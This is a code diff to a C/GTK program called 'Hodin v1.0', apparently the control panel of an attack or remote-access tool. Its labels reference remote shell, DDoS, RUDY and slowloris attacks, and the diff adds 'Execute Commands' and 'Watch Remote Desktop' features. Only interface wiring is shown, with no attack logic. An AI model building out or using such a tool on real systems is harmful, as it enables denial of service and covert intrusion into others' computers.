@@ -11,6 +11,7 @@
 #include <string.h>
 
 #include <gtk-2.0/gtk/gtk.h>
+#include <gst/gst.h>
 
 #include "../includes/constants.h"
 
@@ -19,7 +20,7 @@
 #include "../includes/callbacks_remote_shell.h"
 #include "../includes/callbacks_ddos.h"
 #include "../includes/callbacks_rudy_ddos.h"
-
+#include "../includes/callbacks_execute_commands.h"
 
 
 GtkWidget *main_win = NULL;
@@ -34,6 +35,9 @@ int main(int argc, char *argv[])
 {
     /* Initialize GTK */
     gtk_init(&argc, &argv);
+
+    /* Initialize GStreamer */
+    gst_init (&argc, &argv);
 
     main_win = gtk_window_new(GTK_WINDOW_TOPLEVEL);
     gtk_window_set_title(GTK_WINDOW(main_win), "Hodin v1.0");
@@ -125,6 +129,11 @@ void fill_window(char *argv[])
 
     //GtkWidget *rs_text_view = NULL;
     GtkWidget *rs_scrollbar = NULL;
+
+    /** Execute Commands Vars **/
+    GtkWidget *remote_desktop = NULL;
+
+
 
     /** Initialize the zone[0] for blit widgets **/
     zone[0] = gtk_fixed_new();
@@ -489,7 +498,7 @@ computer across a computer network.\"", -1);
     slowloris_send_script = gtk_button_new_with_label("SLOWLORIS DDOS");
     gtk_widget_set_size_request(slowloris_send_script, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[2]), slowloris_send_script, 980, 150);
-    //g_signal_connect(G_OBJECT(slowloris_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);s
+    //g_signal_connect(G_OBJECT(slowloris_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);
 
     /** Frame 4 (Logs) **/
     frame[6] = gtk_frame_new(NULL);
@@ -511,14 +520,19 @@ computer across a computer network.\"", -1);
     gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(ddos_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
     //gtk_widget_set_size_request(ddos_text_view, 320, 400);
 
-    /** Fake Message **/
+    /** Execute Commands **/
     frame[30] = gtk_frame_new(NULL);
-    gtk_frame_set_label(GTK_FRAME(frame[30]), "- Fake Message - ");
+    gtk_frame_set_label(GTK_FRAME(frame[30]), "- Execute Commands - ");
     gtk_frame_set_label_align(GTK_FRAME(frame[30]), (gfloat)0.05, (gfloat)0.5);
     gtk_frame_set_shadow_type(GTK_FRAME(frame[30]), GTK_SHADOW_OUT);
 
     gtk_widget_set_usize(frame[30], 430, 580);
     gtk_fixed_put(GTK_FIXED(zone[0]), frame[30], 820, 10);
+
+    remote_desktop = gtk_button_new_with_label("Watch Remote Desktop");
+    gtk_widget_set_size_request(remote_desktop, 200, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), remote_desktop, 850, 50);
+    g_signal_connect(G_OBJECT(remote_desktop), "clicked", G_CALLBACK(cb_watch_remote_desktop), NULL);
 
     return;
 }
